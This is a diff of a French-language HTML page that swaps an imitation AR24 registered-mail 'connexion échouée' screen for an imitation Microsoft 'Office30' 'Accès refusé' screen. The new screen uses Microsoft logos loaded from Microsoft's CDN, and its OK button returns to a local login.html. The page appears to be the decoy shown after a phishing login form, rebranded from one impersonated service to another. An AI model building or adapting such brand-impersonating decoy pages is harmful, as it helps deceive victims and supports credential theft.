@@ -1,99 +1,213 @@
 <!DOCTYPE html>
-<html lang="fr" class="no-js">
+<html lang="fr">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
-    <title>Authentifié - AR24</title>
-    <link
-      rel="stylesheet"
-      href="https://app.ar24.fr/static/min/?f=css/reset.css,css/design-system.css,fonts/font-barlow.css,fonts/font-montserrat.css&1771239617"
-    />
-    <link
-      href="https://app.ar24.fr/static/css/pages/user-login.css?v=1771239617"
-      rel="stylesheet"
-      type="text/css"
-    />
+    <title>Refusé - Office30</title>
     <style>
-      .success-wrapper {
-        min-height: calc(100vh - 260px);
+      button {
+        appearance: auto;
+        text-rendering: auto;
+        color: buttontext;
+        letter-spacing: normal;
+        word-spacing: normal;
+        line-height: normal;
+        text-transform: none;
+        text-indent: 0;
+        text-shadow: none;
+        display: inline-block;
+        text-align: center;
+        cursor: default;
+        box-sizing: border-box;
+        background-color: buttonface;
+        margin: 0;
+        padding-block: 1px;
+        padding-inline: 6px;
+        border-width: 2px;
+        border-style: outset;
+        border-color: buttonborder;
+        border-image: initial;
+      }
+
+      #app-host,
+      body {
+        width: 100%;
+        height: 100%;
+        margin: 0;
+        padding: 0;
+        font-family: Segoe UI, sans-serif;
         display: flex;
         justify-content: center;
         align-items: center;
-        padding: 32px 16px;
       }
 
-      .success-card {
-        width: min(100%, 560px);
-        padding: 40px 32px;
-        border-radius: 28px;
-        background: #ffffff;
-        box-shadow: 0 24px 60px rgba(17, 24, 39, 0.12);
-        text-align: center;
+      html {
+        height: 100%;
       }
 
-      .success-badge {
-        width: 88px;
-        height: 88px;
-        margin: 0 auto 20px;
-        border-radius: 50%;
-        display: grid;
-        place-items: center;
-        background: linear-gradient(145deg, #eef4ff, #dbe7ff);
-        color: #0000ff;
-        font-size: 2.4rem;
-        font-weight: 700;
+      .interrupt-content ::-webkit-scrollbar-thumb {
+        border: 4px solid transparent;
+        background-clip: padding-box;
+        border-radius: 9999px;
+        background-color: rgba(0, 0, 0, 0.3);
       }
 
-      .success-title {
-        margin-bottom: 12px;
-        font-family: 'Montserrat', sans-serif;
-        font-size: clamp(1.8rem, 4vw, 2.5rem);
-        font-weight: 700;
+      .css-97 {
+        width: 100%;
+        max-width: 440px;
+        min-height: 640px;
+        border-radius: 16px;
+        background: #fff;
+        border: 1px solid #e0e0e0;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.14);
+        overflow: hidden;
+        display: flex;
+        flex-direction: column;
       }
 
-      .success-text {
-        margin: 0 0 24px;
-        color: #667085;
+      .css-121 {
+        width: 100%;
+        height: 100%;
+        overflow-y: auto;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .css-99 {
+        padding: 28px 28px 18px;
+      }
+
+      .css-100 {
+        margin-bottom: 20px;
+      }
+
+      .css-101 {
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+      }
+
+      .css-103 {
+        color: #444;
+        font-size: 14px;
+      }
+
+      .css-105 {
+        font-size: 26px;
+        line-height: 1.25;
+        font-weight: 600;
+        color: #1b1b1b;
+      }
+
+      .css-106 {
+        display: flex;
+        justify-content: center;
+        padding: 8px 0 4px;
+      }
+
+      .css-107 {
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+      }
+
+      .css-108 {
+        display: flex;
+        flex-direction: column;
+        gap: 4px;
+      }
+
+      .css-109 {
+        color: #1b1b1b;
+        font-weight: 600;
+        font-size: 16px;
+        line-height: 22px;
+      }
+
+      .css-110 {
+        color: #555;
+        font-size: 14px;
+        line-height: 20px;
+      }
+
+      #StickyFooter.css-112 {
+        margin-top: auto;
+        padding: 14px 20px 18px;
+        border-top: 1px solid #efefef;
+        display: flex;
+        justify-content: flex-end;
+        background: #fff;
+      }
+
+      .root-122 {
+        min-width: 92px;
+        height: 32px;
+        border: 1px solid #0067b8;
+        border-radius: 2px;
+        background: #0067b8;
+        color: #fff;
+        cursor: pointer;
+        padding: 0 14px;
+      }
+
+      .root-122:hover {
+        background: #005a9e;
+        border-color: #005a9e;
+      }
+
+      .label-117 {
+        color: inherit;
+        font-size: 14px;
+        font-weight: 600;
       }
     </style>
   </head>
-  <body class="guest">
-    <header id="header">
-      <div class="wrapper">
-        <a href="#" class="header-logo">AR24 - Lettre Recommandée Électronique</a>
-      </div>
-    </header>
-
-    <main id="main-content">
-      <div class="success-wrapper">
-        <section class="success-card">
-          <div class="success-badge" aria-hidden="true">❌</div>
-          <h1 class="success-title">Connexion échouée</h1>
-          <p class="success-text">
-            
-Oups  impossible de vous connecter pour le moment.
-Merci de vérifier vos informations puis de réessayer 
-          </p>
-          <button class="btn btn-primary" onclick="retryLogin()" >se reconnecter</button>
-        </section>
-      </div>
-    </main>
-
-    <footer id="footer">
-      <div class="wrapper">
-        <div class="top">
-          <div class="logo">
-            <img alt="" src="/static/images/logo/AR24.svg" />
+  <body>
+    <div id="app-host">
+      <div class="ms-Stack interrupt-content css-97">
+        <div id="scrollDiv" class="ms-Stack css-121">
+          <div id="interruptContainer" class="ms-StackItem css-99">
+            <div></div>
+            <div class="ms-Stack css-100">
+              <img
+                src="https://ucis.msdxcdn.microsoft.com/1.0.26075.1/Images/microsoftLogoLightMode.svg"
+                alt="Microsoft"
+                style="height: 24px; width: 112.55px"
+              />
+            </div>
+            <div class="ms-Stack css-101">
+              <div class="ms-StackItem css-102"><span class="css-103">Office30</span></div>
+              <div class="ms-StackItem css-104"><span role="heading" aria-level="1" class="css-105">Accès refusé</span></div>
+              <div class="ms-Stack css-106">
+                <img
+                  src="https://ucis.msdxcdn.microsoft.com/1.0.26075.1/Images/newProductLogoLightMode-512x512.png"
+                  alt="Illustration d'accès refusé"
+                  style="align-self: center; height: 128px; width: 128px"
+                />
+              </div>
+              <div class="ms-Stack css-107">
+                <div class="ms-Stack css-108">
+                  <span role="heading" aria-level="2" class="css-109">Nous ne pouvons pas vous authentifier pour le moment.</span>
+                  <span class="css-110">Veuillez vérifier vos informations puis réessayer. Si le problème persiste, contactez l'assistance.</span>
+                </div>
+              </div>
+            </div>
           </div>
-          <div class="line">
-            <div>Votre solution d'envoi de recommandés électroniques fiable, pratique et efficace.</div>
-            <div>AR24 est une filiale de Docaposte</div>
+          <div id="StickyFooter" class="ms-Stack css-112">
+            <button id="ok-button" type="button" class="ms-Button ms-Button--primary root-122" data-is-focusable="true">
+              <span class="ms-Button-flexContainer flexContainer-114" data-automationid="splitbuttonprimary">
+                <span class="ms-Button-textContainer textContainer-115"><span class="ms-Button-label label-117" id="id__0">OK</span></span>
+              </span>
+            </button>
           </div>
         </div>
       </div>
-    </footer>
-    <script src="st.js"></script>
-    <script src="//code.tidio.co/7infjs1hu3tvvi6swicmo9klmhijsizg.js" async></script>
+    </div>
+
+    <script>
+      document.getElementById('ok-button').addEventListener('click', () => {
+        window.location.href = 'login.html';
+      });
+    </script>
   </body>
 </html>
